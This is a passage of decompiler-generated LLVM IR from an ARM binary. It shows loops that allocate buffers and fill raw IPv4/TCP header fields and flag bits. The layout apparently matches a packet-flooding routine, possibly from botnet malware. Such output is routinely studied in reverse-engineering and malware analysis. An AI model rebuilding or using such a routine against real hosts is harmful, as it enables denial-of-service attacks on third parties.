  br i1 %v9_c854, label %dec_label_pc_c7ec, label %dec_label_pc_c85c

dec_label_pc_c85c:                                ; preds = %bb77
  store i32 %v4_c860, i32* %r1.global-to-local, align 4
  store i32 %v4_c864, i32* %ip.global-to-local, align 4
  store i32 %v4_c868, i32* %r2.global-to-local, align 4
  store i32 %v5_c86c, i32* %r3.global-to-local, align 4
  store i32 %v5_c870, i32* @r5, align 4
  store i1 %v9_c874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c874, label %dec_label_pc_c87c, label %dec_label_pc_c7ec

dec_label_pc_c87c:                                ; preds = %dec_label_pc_c85c
  store i32 %v4_c87c, i32* %r2.global-to-local, align 4
  store i32 %v1_c880, i32* %r3.global-to-local, align 4
  store i1 %v2_c884, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c884, label %dec_label_pc_c8d0, label %dec_label_pc_c88c

dec_label_pc_c88c:                                ; preds = %dec_label_pc_c87c
  store i1 %v2_c88c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c88c, label %dec_label_pc_c7ec, label %dec_label_pc_c894

dec_label_pc_c894:                                ; preds = %dec_label_pc_c88c
  %v0_c894 = load i32, i32* @r7, align 4
  store i32 %v0_c894, i32* %r0.global-to-local, align 4
  %v1_c898 = call i32 @close(i32 %v0_c894)
  store i32 %v1_c898, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c6bc

dec_label_pc_c8a0:                                ; preds = %dec_label_pc_c7ec
  %v0_c8a0 = load i32, i32* @r7, align 4
  store i32 %v0_c8a0, i32* %r0.global-to-local, align 4
  %v1_c8a4 = call i32 @close(i32 %v0_c8a0)
  store i32 %v1_c8a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c6cc

dec_label_pc_c8ac:                                ; preds = %dec_label_pc_c668
  store i32 %v3_c650, i32* %r0.global-to-local, align 4
  %v1_c8b0 = call i32 @close(i32 %v3_c650)
  store i32 %v1_c8b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c8b4

dec_label_pc_c8b4:                                ; preds = %dec_label_pc_c7fc, %dec_label_pc_c480, %dec_label_pc_c8ac
  %v29_c8b8 = phi i32 [ %v3_c650, %dec_label_pc_c480 ], [ %v1_c8b0, %dec_label_pc_c8ac ], [ 0, %dec_label_pc_c7fc ]
  store i32 %v3_c480, i32* %r4.global-to-local, align 4
  ret i32 %v29_c8b8

dec_label_pc_c8bc:                                ; preds = %dec_label_pc_c79c
  %v0_c8bc = call i32 @function_10b68()
  %v1_c8bc = trunc i32 %v0_c8bc to i8
  store i32 %v0_c8bc, i32* %r0.global-to-local, align 4
  %v4_c8c0 = sdiv i32 %v0_c8bc, 256
  store i32 %v4_c8c0, i32* %r3.global-to-local, align 4
  %v1_c8c4 = trunc i32 %v4_c8c0 to i8
  br label %dec_label_pc_c7cc

dec_label_pc_c8d0:                                ; preds = %dec_label_pc_c87c
  %v3_c8d0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c8d0, i32* %r4.global-to-local, align 4
  store i32 %v4_c4a0, i32* %r2.global-to-local, align 4
  %v3_c8d8 = mul i32 %v3_c8d0, 16
  store i32 %v3_c8d8, i32* %ip.global-to-local, align 4
  %v3_c8dc = add i32 %v3_c8d8, %v4_c4a0
  %v4_c8dc = inttoptr i32 %v3_c8dc to i32*
  store i32 %storemerge26, i32* %v4_c8dc, align 4
  %v0_c8e0 = load i32, i32* @r6, align 4
  %v1_c8e0 = add i32 %v0_c8e0, 4
  %v2_c8e0 = inttoptr i32 %v1_c8e0 to i32*
  %v3_c8e0 = load i32, i32* %v2_c8e0, align 4
  store i32 %v3_c8e0, i32* %r0.global-to-local, align 4
  %v1_c8e8 = and i32 %v3_c8e0, 65280
  store i32 %v1_c8e8, i32* %r1.global-to-local, align 4
  store i32 %v4_c4a0, i32* %lr.global-to-local, align 4
  %v3_c8f0 = mul i32 %v3_c8e0, 16777216
  %v4_c8f8 = mul nuw nsw i32 %v1_c8e8, 256
  %v5_c8f8 = or i32 %v4_c8f8, %v3_c8f0
  store i32 %v5_c8f8, i32* %r2.global-to-local, align 4
  %v1_c900 = load i32, i32* %ip.global-to-local, align 4
  %v2_c900 = add i32 %v1_c900, %v4_c4a0
  store i32 %v2_c900, i32* %ip.global-to-local, align 4
  %v2_c904 = call i32 @llvm.bswap.i32(i32 %v3_c8e0)
  store i32 %v2_c904, i32* %r3.global-to-local, align 4
  %v2_c908 = add i32 %v2_c900, 4
  %v3_c908 = inttoptr i32 %v2_c908 to i32*
  store i32 %v2_c904, i32* %v3_c908, align 4
  %v0_c90c = load i32, i32* @r6, align 4
  %v1_c90c = add i32 %v0_c90c, 8
  %v2_c90c = inttoptr i32 %v1_c90c to i32*
  %v3_c90c = load i32, i32* %v2_c90c, align 4
  store i32 %v3_c90c, i32* %r0.global-to-local, align 4
  %v1_c914 = and i32 %v3_c90c, 65280
  store i32 %v1_c914, i32* %r1.global-to-local, align 4
  %v3_c918 = mul i32 %v3_c90c, 16777216
  %v4_c920 = mul nuw nsw i32 %v1_c914, 256
  %v5_c920 = or i32 %v4_c920, %v3_c918
  store i32 %v5_c920, i32* %r2.global-to-local, align 4
  %v2_c928 = call i32 @llvm.bswap.i32(i32 %v3_c90c)
  store i32 %v2_c928, i32* %r3.global-to-local, align 4
  %v1_c92c = load i32, i32* %ip.global-to-local, align 4
  %v2_c92c = add i32 %v1_c92c, 8
  %v3_c92c = inttoptr i32 %v2_c92c to i32*
  store i32 %v2_c928, i32* %v3_c92c, align 4
  %v0_c930 = load i32, i32* @r6, align 4
  %v1_c930 = inttoptr i32 %v0_c930 to i32*
  %v2_c930 = load i32, i32* %v1_c930, align 4
  %v3_c934 = udiv i32 %v2_c930, 65536
  store i32 %v3_c934, i32* %r2.global-to-local, align 4
  %v3_c9384 = udiv i32 %v2_c930, 16777216
  store i32 %v3_c9384, i32* %r1.global-to-local, align 4
  %v0_c93c = load i32, i32* @r5, align 4
  %v3_c93c = sdiv i32 %v0_c93c, 256
  store i32 %v3_c93c, i32* %r3.global-to-local, align 4
  %v1_c940 = trunc i32 %v3_c93c to i8
  %v2_c940 = load i32, i32* %ip.global-to-local, align 4
  %v3_c940 = add i32 %v2_c940, 15
  %v4_c940 = inttoptr i32 %v3_c940 to i8*
  store i8 %v1_c940, i8* %v4_c940, align 1
  %v0_c944 = load i32, i32* %r1.global-to-local, align 4
  %v1_c944 = trunc i32 %v0_c944 to i8
  %v2_c944 = load i32, i32* %ip.global-to-local, align 4
  %v3_c944 = add i32 %v2_c944, 13
  %v4_c944 = inttoptr i32 %v3_c944 to i8*
  store i8 %v1_c944, i8* %v4_c944, align 1
  %v0_c948 = load i32, i32* %r2.global-to-local, align 4
  %v1_c948 = trunc i32 %v0_c948 to i8
  %v2_c948 = load i32, i32* %ip.global-to-local, align 4
  %v3_c948 = add i32 %v2_c948, 12
  %v4_c948 = inttoptr i32 %v3_c948 to i8*
  store i8 %v1_c948, i8* %v4_c948, align 1
  %v0_c94c = load i32, i32* @r5, align 4
  %v1_c94c = trunc i32 %v0_c94c to i8
  %v2_c94c = load i32, i32* %ip.global-to-local, align 4
  %v3_c94c = add i32 %v2_c94c, 14
  %v4_c94c = inttoptr i32 %v3_c94c to i8*
  store i8 %v1_c94c, i8* %v4_c94c, align 1
  %v0_c950 = load i32, i32* @sl, align 4
  store i32 %v0_c950, i32* %r0.global-to-local, align 4
  %v1_c954 = call i32* @malloc(i32 %v0_c950)
  %v3_c954 = ptrtoint i32* %v1_c954 to i32
  store i32 %v3_c954, i32* %r0.global-to-local, align 4
  store i32 %v4_c4b0, i32* %r1.global-to-local, align 4
  %v3_c95c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c95c, i32* %r2.global-to-local, align 4
  %v2_c960 = load i32, i32* %r4.global-to-local, align 4
  %v5_c960 = mul i32 %v2_c960, 4
  %v6_c960 = add i32 %v5_c960, %v4_c4b0
  %v7_c960 = inttoptr i32 %v6_c960 to i32*
  store i32 %v3_c954, i32* %v7_c960, align 4
  %v0_c964 = load i32, i32* %r1.global-to-local, align 4
  %v1_c964 = load i32, i32* %r2.global-to-local, align 4
  %v4_c964 = mul i32 %v1_c964, 4
  %v5_c964 = add i32 %v4_c964, %v0_c964
  %v6_c964 = inttoptr i32 %v5_c964 to i32*
  %v7_c964 = load i32, i32* %v6_c964, align 4
  store i32 %v7_c964, i32* @r4, align 4
  %v1_c968 = inttoptr i32 %v7_c964 to i8*
  %v2_c968 = load i8, i8* %v1_c968, align 1
  %tmp102 = urem i8 %v2_c968, 16
  %v1_c96c = zext i8 %tmp102 to i32
  %v1_c970 = or i32 %v1_c96c, 64
  store i32 %v1_c970, i32* %r3.global-to-local, align 4
  %v1_c974 = trunc i32 %v1_c970 to i8
  store i8 %v1_c974, i8* %v1_c968, align 1
  %v0_c978 = load i32, i32* @r4, align 4
  %v1_c978 = inttoptr i32 %v0_c978 to i8*
  %v2_c978 = load i8, i8* %v1_c978, align 1
  store i32 %v3_c698, i32* %ip.global-to-local, align 4
  %v1_c984 = and i8 %v2_c978, -16
  %v1_c98c = or i8 %v1_c984, 5
  store i32 %v5_c990, i32* %r0.global-to-local, align 4
  %v0_c994 = load i32, i32* @sl, align 4
  %v3_c994 = mul i32 %v0_c994, 65536
  store i32 %v3_c994, i32* %r2.global-to-local, align 4
  store i32 %v1_c530, i32* %lr.global-to-local, align 4
  store i8 %v1_c98c, i8* %v1_c978, align 1
  store i32 %v4_c9a0, i32* %r1.global-to-local, align 4
  %v0_c9a4 = load i32, i32* %r2.global-to-local, align 4
  %v3_c9a4 = udiv i32 %v0_c9a4, 65536
  %v1_c9a8 = urem i32 %v3_c9a4, 256
  store i32 %v1_c9a8, i32* %r3.global-to-local, align 4
  %v3_c9ac = udiv i32 %v0_c9a4, 16777216
  store i32 %v3_c9ac, i32* %r2.global-to-local, align 4
  %v2_c9b0 = load i32, i32* @r4, align 4
  %v3_c9b0 = add i32 %v2_c9b0, 1
  %v4_c9b0 = inttoptr i32 %v3_c9b0 to i8*
  store i8 %v1_c9b0, i8* %v4_c9b0, align 1
  %v0_c9b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c9b4 = load i32, i32* %r3.global-to-local, align 4
  %v4_c9b4 = mul i32 %v1_c9b4, 256
  %v5_c9b4 = or i32 %v4_c9b4, %v0_c9b4
  store i32 %v5_c9b4, i32* %r2.global-to-local, align 4
  %v1_c9b8 = trunc i32 %v0_c9b4 to i8
  %v2_c9b8 = load i32, i32* @r4, align 4
  %v3_c9b8 = add i32 %v2_c9b8, 2
  %v4_c9b8 = inttoptr i32 %v3_c9b8 to i8*
  store i8 %v1_c9b8, i8* %v4_c9b8, align 1
  %v0_c9bc = load i32, i32* %lr.global-to-local, align 4
  %v2_c9bc = icmp eq i32 %v0_c9bc, 0
  store i1 %v2_c9bc, i1* %cpsr_z.global-to-local, align 1
  %v0_c9c0 = load i32, i32* %r2.global-to-local, align 4
  %v3_c9c0 = sdiv i32 %v0_c9c0, 256
  store i32 %v3_c9c0, i32* %r3.global-to-local, align 4
  store i32 %v4_c9c4, i32* %r2.global-to-local, align 4
  %v1_c9c8 = trunc i32 %v3_c9c0 to i8
  %v2_c9c8 = load i32, i32* @r4, align 4
  %v3_c9c8 = add i32 %v2_c9c8, 3
  %v4_c9c8 = inttoptr i32 %v3_c9c8 to i8*
  store i8 %v1_c9c8, i8* %v4_c9c8, align 1
  %v0_c9cc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c9cc, label %bb79, label %bb78

bb78:                                             ; preds = %dec_label_pc_c8d0
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_c8d0, %bb78
  %v0_c9d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c9d0 = trunc i32 %v0_c9d0 to i8
  %v2_c9d0 = load i32, i32* @r4, align 4
  %v3_c9d0 = add i32 %v2_c9d0, 8
  %v4_c9d0 = inttoptr i32 %v3_c9d0 to i8*
  store i8 %v1_c9d0, i8* %v4_c9d0, align 1
  %v0_c9d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c9d4, label %.thread7, label %bb80

bb80:                                             ; preds = %bb79
  %v1_c9d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_c9d4 = trunc i32 %v1_c9d4 to i8
  %v3_c9d4 = load i32, i32* @r4, align 4
  %v4_c9d4 = add i32 %v3_c9d4, 6
  %v5_c9d4 = inttoptr i32 %v4_c9d4 to i8*
  store i8 %v2_c9d4, i8* %v5_c9d4, align 1
  %v0_c9d8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c9d8.pr, label %.thread7, label %bb81

bb81:                                             ; preds = %bb80
  store i32 0, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb79, %bb80, %bb81
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_c9e0 = load i32, i32* @r4, align 4
  %v3_c9e0 = add i32 %v2_c9e0, 9
  %v4_c9e0 = inttoptr i32 %v3_c9e0 to i8*
  store i8 6, i8* %v4_c9e0, align 1
  %v0_c9e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c9e4, label %bb83, label %bb82

bb82:                                             ; preds = %.thread7
  %v1_c9e4 = load i32, i32* %r2.global-to-local, align 4
  %v2_c9e4 = trunc i32 %v1_c9e4 to i8
  %v3_c9e4 = load i32, i32* @r4, align 4
  %v4_c9e4 = add i32 %v3_c9e4, 7
  %v5_c9e4 = inttoptr i32 %v4_c9e4 to i8*
  store i8 %v2_c9e4, i8* %v5_c9e4, align 1
  br label %bb83

bb83:                                             ; preds = %.thread7, %bb82
  %v2_c9ec = load i32, i32* @global_var_1cd48.140, align 4
  store i32 %v2_c9ec, i32* %r3.global-to-local, align 4
  %v0_c9f0 = load i32, i32* %r0.global-to-local, align 4
  %v3_c9f0 = sdiv i32 %v0_c9f0, 256
  store i32 %v3_c9f0, i32* %ip.global-to-local, align 4
  %v1_c9f4 = load i32, i32* @r4, align 4
  %v2_c9f4 = add i32 %v1_c9f4, 12
  %v3_c9f4 = inttoptr i32 %v2_c9f4 to i32*
  store i32 %v2_c9ec, i32* %v3_c9f4, align 4
  %v0_c9f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_c9f8 = trunc i32 %v0_c9f8 to i8
  %v2_c9f8 = load i32, i32* @r4, align 4
  %v3_c9f8 = add i32 %v2_c9f8, 5
  %v4_c9f8 = inttoptr i32 %v3_c9f8 to i8*
  store i8 %v1_c9f8, i8* %v4_c9f8, align 1
  %v3_c9fc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c9fc, i32* %r2.global-to-local, align 4
  store i32 %v4_c4a0, i32* %ip.global-to-local, align 4
  %v4_ca04 = mul i32 %v3_c9fc, 16
  %v5_ca04 = add i32 %v4_ca04, %v4_c4a0
  %v6_ca04 = inttoptr i32 %v5_ca04 to i32*
  %v7_ca04 = load i32, i32* %v6_ca04, align 4
  store i32 %v7_ca04, i32* %r3.global-to-local, align 4
  %v0_ca08 = load i32, i32* %r0.global-to-local, align 4
  %v1_ca08 = trunc i32 %v0_ca08 to i8
  %v2_ca08 = load i32, i32* @r4, align 4
  %v3_ca08 = add i32 %v2_ca08, 4
  %v4_ca08 = inttoptr i32 %v3_ca08 to i8*
  store i8 %v1_ca08, i8* %v4_ca08, align 1
  %v0_ca0c = load i32, i32* %r3.global-to-local, align 4
  %v1_ca0c = load i32, i32* @r4, align 4
  %v2_ca0c = add i32 %v1_ca0c, 16
  %v3_ca0c = inttoptr i32 %v2_ca0c to i32*
  store i32 %v0_ca0c, i32* %v3_ca0c, align 4
  %v0_ca10 = load i32, i32* %r2.global-to-local, align 4
  %v3_ca10 = mul i32 %v0_ca10, 16
  %v1_ca14 = load i32, i32* %ip.global-to-local, align 4
  %v2_ca14 = add i32 %v1_ca14, %v3_ca10
  store i32 %v2_ca14, i32* %r2.global-to-local, align 4
  %v1_ca18 = add i32 %v2_ca14, 13
  %v2_ca18 = inttoptr i32 %v1_ca18 to i8*
  %v3_ca18 = load i8, i8* %v2_ca18, align 1
  %v4_ca18 = zext i8 %v3_ca18 to i32
  store i32 %v4_ca18, i32* %r1.global-to-local, align 4
  %v1_ca1c = add i32 %v2_ca14, 12
  %v2_ca1c = inttoptr i32 %v1_ca1c to i8*
  %v3_ca1c = load i8, i8* %v2_ca1c, align 1
  %v4_ca1c = zext i8 %v3_ca1c to i32
  %v4_ca20 = mul nuw nsw i32 %v4_ca18, 256
  %v5_ca20 = or i32 %v4_ca1c, %v4_ca20
  store i32 %v5_ca20, i32* %r3.global-to-local, align 4
  %v2_ca24 = load i32, i32* @r4, align 4
  %v3_ca24 = add i32 %v2_ca24, 20
  %v4_ca24 = inttoptr i32 %v3_ca24 to i8*
  store i8 %v3_ca1c, i8* %v4_ca24, align 1
  %v0_ca28 = load i32, i32* @r4, align 4
  %v1_ca28 = add i32 %v0_ca28, 20
  store i32 %v1_ca28, i32* @r6, align 4
  %v0_ca2c = load i32, i32* %r3.global-to-local, align 4
  %v3_ca2c = sdiv i32 %v0_ca2c, 256
  store i32 %v3_ca2c, i32* %r3.global-to-local, align 4
  %v1_ca30 = trunc i32 %v3_ca2c to i8
  %v3_ca30 = add i32 %v0_ca28, 21
  %v4_ca30 = inttoptr i32 %v3_ca30 to i8*
  store i8 %v1_ca30, i8* %v4_ca30, align 1
  %v0_ca34 = load i32, i32* @r6, align 4
  %v1_ca34 = add i32 %v0_ca34, 13
  %v2_ca34 = inttoptr i32 %v1_ca34 to i8*
  %v3_ca34 = load i8, i8* %v2_ca34, align 1
  %v4_ca34 = zext i8 %v3_ca34 to i32
  store i32 %v4_ca34, i32* %r3.global-to-local, align 4
  %v0_ca38 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca38 = add i32 %v0_ca38, 8
  %v2_ca38 = inttoptr i32 %v1_ca38 to i32*
  %v3_ca38 = load i32, i32* %v2_ca38, align 4
  store i32 %v3_ca38, i32* %r1.global-to-local, align 4
  %v1_ca3c = or i32 %v4_ca34, 1
  store i32 %v1_ca3c, i32* %r3.global-to-local, align 4
  %v1_ca40 = add i32 %v0_ca38, 15
  %v2_ca40 = inttoptr i32 %v1_ca40 to i8*
  %v3_ca40 = load i8, i8* %v2_ca40, align 1
  %v4_ca40 = zext i8 %v3_ca40 to i32
  store i32 %v4_ca40, i32* %ip.global-to-local, align 4
  %v1_ca44 = add i32 %v0_ca38, 14
  %v2_ca44 = inttoptr i32 %v1_ca44 to i8*
  %v3_ca44 = load i8, i8* %v2_ca44, align 1
  %v4_ca44 = zext i8 %v3_ca44 to i32
  store i32 %v4_ca44, i32* %r0.global-to-local, align 4
  %v2_ca48 = add i32 %v0_ca34, 4
  %v3_ca48 = inttoptr i32 %v2_ca48 to i32*
  store i32 %v3_ca38, i32* %v3_ca48, align 4
  %v0_ca4c = load i32, i32* %r2.global-to-local, align 4
  %v1_ca4c = add i32 %v0_ca4c, 4
  %v2_ca4c = inttoptr i32 %v1_ca4c to i32*
  %v3_ca4c = load i32, i32* %v2_ca4c, align 4
  store i32 %v3_ca4c, i32* %lr.global-to-local, align 4
  %v0_ca50 = load i32, i32* %r3.global-to-local, align 4
  %v1_ca50 = trunc i32 %v0_ca50 to i8
  %v2_ca50 = load i32, i32* @r6, align 4
  %v3_ca50 = add i32 %v2_ca50, 13
  %v4_ca50 = inttoptr i32 %v3_ca50 to i8*
  store i8 %v1_ca50, i8* %v4_ca50, align 1
  %v0_ca54 = load i32, i32* @r6, align 4
  %v1_ca54 = add i32 %v0_ca54, 12
  %v2_ca54 = inttoptr i32 %v1_ca54 to i8*
  %v3_ca54 = load i8, i8* %v2_ca54, align 1
  %v4_ca54 = zext i8 %v3_ca54 to i32
  store i32 %v4_ca54, i32* %r2.global-to-local, align 4
  %v1_ca58 = add i32 %v0_ca54, 13
  %v2_ca58 = inttoptr i32 %v1_ca58 to i8*
  %v3_ca58 = load i8, i8* %v2_ca58, align 1
  %v4_ca58 = zext i8 %v3_ca58 to i32
  %v0_ca5c = load i32, i32* %r0.global-to-local, align 4
  %v1_ca5c = load i32, i32* %ip.global-to-local, align 4
  %v4_ca5c = mul i32 %v1_ca5c, 256
  %v5_ca5c = or i32 %v4_ca5c, %v0_ca5c
  store i32 %v5_ca5c, i32* %r0.global-to-local, align 4
  %tmp103 = urem i8 %v3_ca54, 16
  %v1_ca60 = zext i8 %tmp103 to i32
  %v3_ca64 = sdiv i32 %v5_ca5c, 256
  store i32 %v3_ca64, i32* %r1.global-to-local, align 4
  %v1_ca68 = or i32 %v1_ca60, 128
  store i32 %v1_ca68, i32* %r2.global-to-local, align 4
  %v1_ca6c = or i32 %v4_ca58, 16
  store i32 %v1_ca6c, i32* %r3.global-to-local, align 4
  %v1_ca70 = trunc i32 %v3_ca64 to i8
  %v3_ca70 = add i32 %v0_ca54, 3
  %v4_ca70 = inttoptr i32 %v3_ca70 to i8*
  store i8 %v1_ca70, i8* %v4_ca70, align 1
  %v0_ca74 = load i32, i32* %lr.global-to-local, align 4
  %v1_ca74 = load i32, i32* @r6, align 4
  %v2_ca74 = add i32 %v1_ca74, 8
  %v3_ca74 = inttoptr i32 %v2_ca74 to i32*
  store i32 %v0_ca74, i32* %v3_ca74, align 4
  %v0_ca78 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca78 = trunc i32 %v0_ca78 to i8
  %v2_ca78 = load i32, i32* @r6, align 4
  %v3_ca78 = add i32 %v2_ca78, 12
  %v4_ca78 = inttoptr i32 %v3_ca78 to i8*
  store i8 %v1_ca78, i8* %v4_ca78, align 1
  %v0_ca7c = load i32, i32* %r3.global-to-local, align 4
  %v1_ca7c = trunc i32 %v0_ca7c to i8
  %v2_ca7c = load i32, i32* @r6, align 4
  %v3_ca7c = add i32 %v2_ca7c, 13
  %v4_ca7c = inttoptr i32 %v3_ca7c to i8*
  store i8 %v1_ca7c, i8* %v4_ca7c, align 1
  %v0_ca80 = load i32, i32* %r0.global-to-local, align 4
  %v1_ca80 = trunc i32 %v0_ca80 to i8
  %v2_ca80 = load i32, i32* @r6, align 4
  %v3_ca80 = add i32 %v2_ca80, 2
  %v4_ca80 = inttoptr i32 %v3_ca80 to i8*
  store i8 %v1_ca80, i8* %v4_ca80, align 1
  %v0_ca84 = call i32 @function_10b68()
  %v1_ca84 = trunc i32 %v0_ca84 to i8
  store i32 %v0_ca84, i32* %r0.global-to-local, align 4
  store i32 %v1_c568, i32* %lr.global-to-local, align 4
  %v0_ca8c = load i32, i32* @r6, align 4
  %v1_ca8c = add i32 %v0_ca8c, 13
  %v2_ca8c = inttoptr i32 %v1_ca8c to i8*
  %v3_ca8c = load i8, i8* %v2_ca8c, align 1
  %v4_ca8c = zext i8 %v3_ca8c to i32
  store i32 %v1_ca90, i32* %r2.global-to-local, align 4
  %v1_ca94 = and i32 %v4_ca8c, 223
  %v5_ca98 = or i32 %v1_ca94, %v4_ca98
  store i32 %v5_ca98, i32* %r3.global-to-local, align 4
  %v1_ca9c = trunc i32 %v5_ca98 to i8
  store i8 %v1_ca9c, i8* %v2_ca8c, align 1
  store i32 %v1_c588, i32* %r1.global-to-local, align 4
  %v0_caa4 = load i32, i32* @r6, align 4
  %v1_caa4 = add i32 %v0_caa4, 13
  %v2_caa4 = inttoptr i32 %v1_caa4 to i8*
  %v3_caa4 = load i8, i8* %v2_caa4, align 1
  %v4_caa4 = zext i8 %v3_caa4 to i32
  store i32 %v1_caa8, i32* %r3.global-to-local, align 4
  %v1_caac = and i32 %v4_caa4, 239
  %v5_cab0 = or i32 %v1_caac, %v4_cab0
  store i32 %v5_cab0, i32* %r2.global-to-local, align 4
  %v1_cab4 = trunc i32 %v5_cab0 to i8
  store i8 %v1_cab4, i8* %v2_caa4, align 1
  store i32 %v1_c5a8, i32* %ip.global-to-local, align 4
  %v0_cabc = load i32, i32* @r6, align 4
  %v1_cabc = add i32 %v0_cabc, 13
  %v2_cabc = inttoptr i32 %v1_cabc to i8*
  %v3_cabc = load i8, i8* %v2_cabc, align 1
  %v4_cabc = zext i8 %v3_cabc to i32
  store i32 %v1_cac0, i32* %r2.global-to-local, align 4
  %v1_cac4 = and i32 %v4_cabc, 247
  %v5_cac8 = or i32 %v1_cac4, %v4_cac8
  store i32 %v5_cac8, i32* %r3.global-to-local, align 4
  %v1_cacc = trunc i32 %v5_cac8 to i8
  store i8 %v1_cacc, i8* %v2_cabc, align 1
  store i32 %v1_c5c8, i32* %lr.global-to-local, align 4
  %v0_cad4 = load i32, i32* @r6, align 4
  %v1_cad4 = add i32 %v0_cad4, 13
  %v2_cad4 = inttoptr i32 %v1_cad4 to i8*
  %v3_cad4 = load i8, i8* %v2_cad4, align 1
  %v4_cad4 = zext i8 %v3_cad4 to i32
  store i32 %v1_cad8, i32* %r3.global-to-local, align 4
  %v1_cadc = and i32 %v4_cad4, 251
  %v5_cae0 = or i32 %v1_cadc, %v4_cae0
  store i32 %v5_cae0, i32* %r2.global-to-local, align 4
  %v1_cae4 = trunc i32 %v5_cae0 to i8
  store i8 %v1_cae4, i8* %v2_cad4, align 1
  store i32 %v1_c5e8, i32* %r1.global-to-local, align 4
  %v0_caec = load i32, i32* @r6, align 4
  %v1_caec = add i32 %v0_caec, 13
  %v2_caec = inttoptr i32 %v1_caec to i8*
  %v3_caec = load i8, i8* %v2_caec, align 1
  %v4_caec = zext i8 %v3_caec to i32
  store i32 %v1_caf0, i32* %r2.global-to-local, align 4
  %v1_caf4 = and i32 %v4_caec, 253
  %v4_caf8 = or i32 %v1_caf4, %v3_caf8
  store i32 %v4_caf8, i32* %r3.global-to-local, align 4
  %v1_cafc = trunc i32 %v4_caf8 to i8
  store i8 %v1_cafc, i8* %v2_caec, align 1
  %v0_cb00 = load i32, i32* @r6, align 4
  %v1_cb00 = add i32 %v0_cb00, 13
  %v2_cb00 = inttoptr i32 %v1_cb00 to i8*
  %v3_cb00 = load i8, i8* %v2_cb00, align 1
  %v4_cb00 = zext i8 %v3_cb00 to i32
  %v0_cb04 = load i32, i32* @r8, align 4
  %v1_cb04 = urem i32 %v0_cb04, 2
  %v1_cb08 = and i32 %v4_cb00, 254
  store i32 %v1_cb08, i32* %r2.global-to-local, align 4
  %v4_cb0c28 = udiv i32 %v0_ca84, 256
  %v2_cb10 = or i32 %v1_cb08, %v1_cb04
  store i32 %v2_cb10, i32* %r3.global-to-local, align 4
  %v1_cb14 = trunc i32 %v4_cb0c28 to i8
  %v3_cb14 = add i32 %v0_cb00, 15
  %v4_cb14 = inttoptr i32 %v3_cb14 to i8*
  store i8 %v1_cb14, i8* %v4_cb14, align 1
  %v3_cb18 = load i32, i32* @r6, align 4
  %v4_cb18 = add i32 %v3_cb18, 14
  %v5_cb18 = inttoptr i32 %v4_cb18 to i8*
  store i8 %v1_ca84, i8* %v5_cb18, align 1
  %v0_cb1c = load i32, i32* %r3.global-to-local, align 4
  %v1_cb1c = trunc i32 %v0_cb1c to i8
  %v2_cb1c = load i32, i32* @r6, align 4
  %v3_cb1c = add i32 %v2_cb1c, 13
  %v4_cb1c = inttoptr i32 %v3_cb1c to i8*
  store i8 %v1_cb1c, i8* %v4_cb1c, align 1
  %v0_cb20 = load i32, i32* @r4, align 4
  %v1_cb20 = add i32 %v0_cb20, 40
  store i32 %v1_cb20, i32* %r0.global-to-local, align 4
  %v0_cb24 = load i32, i32* @sb, align 4
  store i32 %v0_cb24, i32* @r1, align 4
  %v1_cb28 = inttoptr i32 %v1_cb20 to i8*
  %v2_cb28 = call i32 @function_10d44(i8* %v1_cb28)
  store i32 %v2_cb28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cb2c

dec_label_pc_cb2c:                                ; preds = %dec_label_pc_c6cc, %bb83
  %v3_cb2c = load i32, i32* %stack_var_-40, align 4
  %v1_cb30 = add i32 %v3_cb2c, 1
  store i32 %v1_cb30, i32* %r3.global-to-local, align 4
  %v1_cb34 = load i32, i32* @fp, align 4
  %v9_cb34 = icmp eq i32 %v1_cb30, %v1_cb34
  store i1 %v9_cb34, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cb30, i32* %stack_var_-40, align 4
  %v5_cb3c = icmp slt i32 %v1_cb30, %v1_cb34
  br i1 %v5_cb3c, label %dec_label_pc_c6bc, label %dec_label_pc_cb40

dec_label_pc_cb40:                                ; preds = %dec_label_pc_cb2c, %.thread19
  %v0_cb4813 = phi i32 [ %v0_c690, %.thread19 ], [ %v1_cb34, %dec_label_pc_cb2c ]
  %v0_cb40 = load i32, i32* @sb, align 4
  %v1_cb40 = add i32 %v0_cb40, 40
  store i32 %v1_cb40, i32* @sl, align 4
  %v1_cb44 = add i32 %v0_cb40, 20
  store i32 %v1_cb44, i32* @r7, align 4
  %v2_cb94 = icmp eq i32 %v1_c640, 0
  %v3_cb7c = icmp eq i32 %v3_c698, 65535
  br label %dec_label_pc_cb48

dec_label_pc_cb48:                                ; preds = %dec_label_pc_cba4, %dec_label_pc_cb40
  %v0_cb48 = phi i32 [ %v1_cc84, %dec_label_pc_cba4 ], [ %v0_cb4813, %dec_label_pc_cb40 ]
  %v2_cb48 = icmp eq i32 %v0_cb48, 0
  store i1 %v2_cb48, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp84 = icmp slt i32 %v0_cb48, 1
  br label %dec_label_pc_cb50

dec_label_pc_cb50:                                ; preds = %dec_label_pc_cb50, %dec_label_pc_cb48
  br i1 %tmp84, label %dec_label_pc_cb50, label %dec_label_pc_cb54

dec_label_pc_cb54:                                ; preds = %dec_label_pc_cb50
  %v0_cb54 = load i32, i32* @r7, align 4
  %tmp85 = mul i32 %v0_cb54, 256
